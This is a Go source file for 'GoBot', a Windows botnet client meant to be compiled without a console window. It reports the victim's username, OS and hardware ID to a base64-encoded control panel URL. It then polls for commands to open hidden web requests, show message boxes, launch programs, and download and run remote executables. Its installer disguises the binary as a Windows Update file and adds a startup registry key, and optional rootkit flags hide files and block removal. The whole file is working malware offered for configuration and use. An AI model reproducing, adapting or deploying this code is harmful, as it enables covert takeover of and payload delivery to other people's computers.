//Compile with   go build -o GoBot.exe -ldflags "-H windowsgui" "C:\gobot.go"    to have no console show.
// By SaturnsVoid

package main

import (
	"bytes"
    "fmt"
    "io/ioutil"
	"io"
	"math/rand"
    "net/http"
	"syscall"
    "unsafe"
	"strings"
	"time"
	"net/url"
	"os/user"
	"github.com/luisiturrios/gowin"
	"crypto/md5"
    "encoding/hex"
	"encoding/base64"
	"os"
	"os/exec"

	"GoBot/rootkit"
)

var(
//================================================================================
//================================================================================
//================================================================================
//==========================================================Edit
Panel string = "aHR0cDovLzEyNy4wLjAuMS9nb2JvdC9Hb0JvdC5waHA=" //Control Panel URL(Base64 Encoded) http://127.0.0.1/cmd.php = aHR0cDovLzEyNy4wLjAuMS9jbWQucGhw
ReconnectTime time.Duration = 5 //Minutes
SingleInstance bool = true //True = Only one can run, False = Mutliple can run at once
InstanceKey string = "0f7b0fcd-d67c-43d8-b7e5-76f95da01665" //Key to detect for Single Instance http://www.guidgen.com/
USE_Install bool = false // If enabled, GoBot will add itelf to startup
USE_Stealth bool = false // If enabled, GoBot will add hidden and system attributes to its files
USE_Rootkit bool = false /* If enabled, this will:
										- Actively cloak GoBot's files from user detection
										- Actively monitor registry to prevent removal from start up
										- Disable task manager and other system tools
										- Protect GoBot's process from termination */

//==========================================================End Edit
//================================================================================
//================================================================================
//================================================================================
LastCMD string

modkernel32 = syscall.NewLazyDLL("kernel32.dll")
procCreateMailslot = modkernel32.NewProc("CreateMailslotW")

kernel32, _        = syscall.LoadLibrary("kernel32.dll")
getModuleHandle, _ = syscall.GetProcAddress(kernel32, "GetModuleHandleW")

user32, _     = syscall.LoadLibrary("user32.dll")
messageBox, _ = syscall.GetProcAddress(user32, "MessageBoxW")
)

const (
    MB_OK                = 0x00000000
    MB_OKCANCEL          = 0x00000001
    MB_ABORTRETRYIGNORE  = 0x00000002
    MB_YESNOCANCEL       = 0x00000003
    MB_YESNO             = 0x00000004
    MB_RETRYCANCEL       = 0x00000005
    MB_CANCELTRYCONTINUE = 0x00000006
    MB_ICONHAND          = 0x00000010
    MB_ICONQUESTION      = 0x00000020
    MB_ICONEXCLAMATION   = 0x00000030
    MB_ICONASTERISK      = 0x00000040
    MB_USERICON          = 0x00000080
    MB_ICONWARNING       = MB_ICONEXCLAMATION
    MB_ICONERROR         = MB_ICONHAND
    MB_ICONINFORMATION   = MB_ICONASTERISK
    MB_ICONSTOP          = MB_ICONHAND

    MB_DEFBUTTON1 = 0x00000000
    MB_DEFBUTTON2 = 0x00000100
    MB_DEFBUTTON3 = 0x00000200
    MB_DEFBUTTON4 = 0x00000300
	
	letterBytes = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
)

func main() {
	defer syscall.FreeLibrary(kernel32)
    defer syscall.FreeLibrary(user32)
	
	if SingleInstance != false{
	  err := singleInstance(InstanceKey)
		if err != nil {
		}
	}
	DebugLog("Started New Instance...")
	DebugLog("Generating HWID: " + getUID())
	if USE_Install {
		DebugLog("Installing GoBot...")
		Install()
	}

	if USE_Stealth && USE_Install {
		DebugLog("Stealth Installing GoBot...")
		rootkit.Stealthify()
	}

	if USE_Rootkit && USE_Stealth && USE_Install {
		DebugLog("Installing GoBot and Activating Rootkit...")
		go rootkit.Install()
	}

	//DebugLog("Sleeping for 1 minute...")
	//time.Sleep(60 * time.Second)
	httpPOSTInformation()
	
	for {
		time.Sleep(ReconnectTime * time.Second)
		httpGETCommands()
	}	
}

func httpGETCommands(){
	rsp, err := http.Get(base64Decode(Panel)+ "?get=" + getUID())
    if err != nil {
	DebugLog("Bad connection to panel...")
    }else{
		defer rsp.Body.Close()
		buf, err := ioutil.ReadAll(rsp.Body)
		if err != nil {
		}else{
			var tmpdat string = string(bytes.TrimSpace(buf))
			if tmpdat == "Bot does not exist."{
				httpPOSTInformation()
			}else{
				DebugLog("Encoded Command Found: " + string(bytes.TrimSpace(buf)))
				data := base64Decode(tmpdat)
				if data != LastCMD{
					tmp := strings.Split(data, "|")
					if tmp[0] == "ALL" || tmp[0] == getUID(){
						DebugLog("Decoded Command for me: " + data)
						if tmp[1] == "0"{
							os.Exit(0)				
						}else if tmp[1] == "1"{
							if tmp[3] == "V"{
									if strings.Contains(tmp[2], "www."){
										DebugLog("Opening Website V: " + tmp[2])
										LastCMD = data	
										exec.Command("cmd", "/c", "start", tmp[2]).Start()				
									}
							}else if tmp[3] == "H"{
									if strings.Contains(tmp[2], "www."){
										DebugLog("Opening Website H: " + tmp[2])
										LastCMD = data	
										rsp, err := http.Get(tmp[2])
										if err != nil {						
										}
										defer rsp.Body.Close()						
									}
								}
						}else if tmp[1] == "2"{
							DebugLog("Showing MessageBox: " + tmp[2])
							LastCMD = data	
							MessageBox(tmp[2], tmp[3], MB_OK)	
						}else if tmp[1] == "3"{
							if strings.Contains(tmp[2], ".exe"){
								DebugLog("Attempting to start: " + tmp[2])
								LastCMD = data	
								run("start " + tmp[2])
							}
						}else if tmp[1] == "4"{
							if strings.Contains(tmp[2], ".exe") && strings.Contains(tmp[2], "http://"){
								DebugLog("Attempting to download and run: " + tmp[2])
								LastCMD = data	
								DownloadAndRun(tmp[2])
							}
						}
					}		
				}	
			}
		}	
	}
}

func httpPOSTInformation(){
		DebugLog("Sending Host Information...")
		data := url.Values{}
		data.Set("INFO", "")
		data.Add("HWID", getUID())
		data.Add("USERNAME", getUsername())
		data.Add("WINDOWS", getOS())
		u, _ := url.ParseRequestURI(base64Decode(Panel))
		urlStr := fmt.Sprintf("%v", u)
		client := &http.Client{}
		r, _ := http.NewRequest("POST", urlStr, bytes.NewBufferString(data.Encode())) // <-- URL-encoded payload
		r.Header.Add("Content-Type", "application/x-www-form-urlencoded")
		resp, err := client.Do(r)
		if err != nil {
		DebugLog("Bad connection to panel...")
		}else{
			DebugLog("Panel: " + resp.Status)
		}
}
//================================================================================
//================================================================================
//================================================================================
//================================================================================
//-----------------------------------------------------------------Single Instance
func singleInstance(name string) error {
    ret, _, _ := procCreateMailslot.Call(
        uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(`\\.\mailslot\`+name))),
        0,
        0,
        0,
    )
    if int64(ret) == -1 {
        os.Exit(0)
    }
    return nil
}
//================================================================================
//================================================================================
//================================================================================
//================================================================================
//-----------------------------------------------------------------Information
func getUsername() string{
	usr, _:= user.Current()
	return usr.Username
}

func getOS()string{
	val, _:= gowin.GetReg("HKLM", `Software\Microsoft\Windows NT\CurrentVersion`, "ProductName")
    return val
}

func getWInstalDate()string{
	val, _:= gowin.GetReg("HKLM", `Software\Microsoft\Windows NT\CurrentVersion`, "InstallDate")
    return val
}

func getUID() string{
	return getMD5Hash("GoBot$" + getUsername() + getOS() + getWInstalDate()+ "$toBoG")
}
//================================================================================
//================================================================================
//================================================================================
//================================================================================
//----------------------------------------------------------------Cryptography
func getMD5Hash(text string) string {
    hasher := md5.New()
    hasher.Write([]byte(text))
    return hex.EncodeToString(hasher.Sum(nil))
}
func base64Encode(str string) string {
    return base64.StdEncoding.EncodeToString([]byte(str))
}

func base64Decode(str string) string {
    data, err := base64.StdEncoding.DecodeString(str)
    if err != nil {
        return ""
    }
    return string(data)
}
//================================================================================
//================================================================================
//================================================================================
//================================================================================
//-----------------------------------------------------------------MessageBox
func abort(funcname string, err error) {
    panic(fmt.Sprintf("%s failed: %v", funcname, err))
}

func MessageBox(caption, text string, style uintptr) (result int) {
    var nargs uintptr = 4
    ret, _, callErr := syscall.Syscall9(uintptr(messageBox),
        nargs,
        0,
        uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(text))),
        uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(caption))),
        style,
        0,
        0,
        0,
        0,
        0)
    if callErr != 0 {
        abort("Call MessageBox", callErr)
    }
    result = int(ret)
    return
}

func GetModuleHandle() (handle uintptr) {
    var nargs uintptr = 0
    if ret, _, callErr := syscall.Syscall(uintptr(getModuleHandle), nargs, 0, 0, 0); callErr != 0 {
        abort("Call GetModuleHandle", callErr)
    } else {
        handle = ret
    }
    return
}
//================================================================================
//================================================================================
//================================================================================
//================================================================================
//--------------------------------------------------------------Installer
func Install() {
	if !(strings.Contains(os.Args[0], "winupdt.exe")) {
		run("mkdir %APPDATA%\\Windows_Update")
		run("copy " + os.Args[0] + " %APPDATA%\\Windows_Update\\winupdt.exe")
		run("REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V Windows_Update /t REG_SZ /F /D %APPDATA%\\Windows_Update\\winupdt.exe")
		run("attrib +H +S " + os.Args[0])
	}
}
//================================================================================
//================================================================================
//================================================================================
//================================================================================
//----------------------------------------------------------------Debug Logger
func DebugLog(text string){
	currenttime := time.Now().Local()
    fmt.Println("[", currenttime.Format("2006-01-02 15:04:05"), "] " + text)
}
//================================================================================
//================================================================================
//================================================================================
//================================================================================
//----------------------------------------------------------------------------CMD Runner
func run(cmd string) {
	c := exec.Command("cmd", "/C", cmd)

    if err := c.Run(); err != nil { 
        //fmt.Println("Error: ", err)
    }   
}
//================================================================================
//================================================================================
//================================================================================
//================================================================================
//--------------------------------------------------------------------------Download and Run File
func DownloadAndRun(url string) {
	fileName := RandStringBytes(5) + ".exe"
	DebugLog("Downloading " + url + " to " + fileName)
	output, err := os.Create(os.Getenv("APPDATA") + "\\" + fileName)
	if err != nil {
		return
	}
	defer output.Close()
	response, err := http.Get(url)
	if err != nil {
		return
	}
	defer response.Body.Close()
	n, err := io.Copy(output, response.Body)
	if err != nil {
		return
	}
	DebugLog(string(n) + " file downloaded.")
	DebugLog(os.Getenv("APPDATA") + "\\" + fileName)
	DebugLog("Attempting to start " + fileName)
	exec.Command("cmd", "/c", "start", os.Getenv("APPDATA") + "\\" + fileName).Start()		
}
//================================================================================
//================================================================================
//================================================================================
//================================================================================
//-------------------------------------------------------------------------Random String Generator
func RandStringBytes(n int) string {
    b := make([]byte, n)
    for i := range b {
        b[i] = letterBytes[rand.Intn(len(letterBytes))]
    }
    return string(b)
}
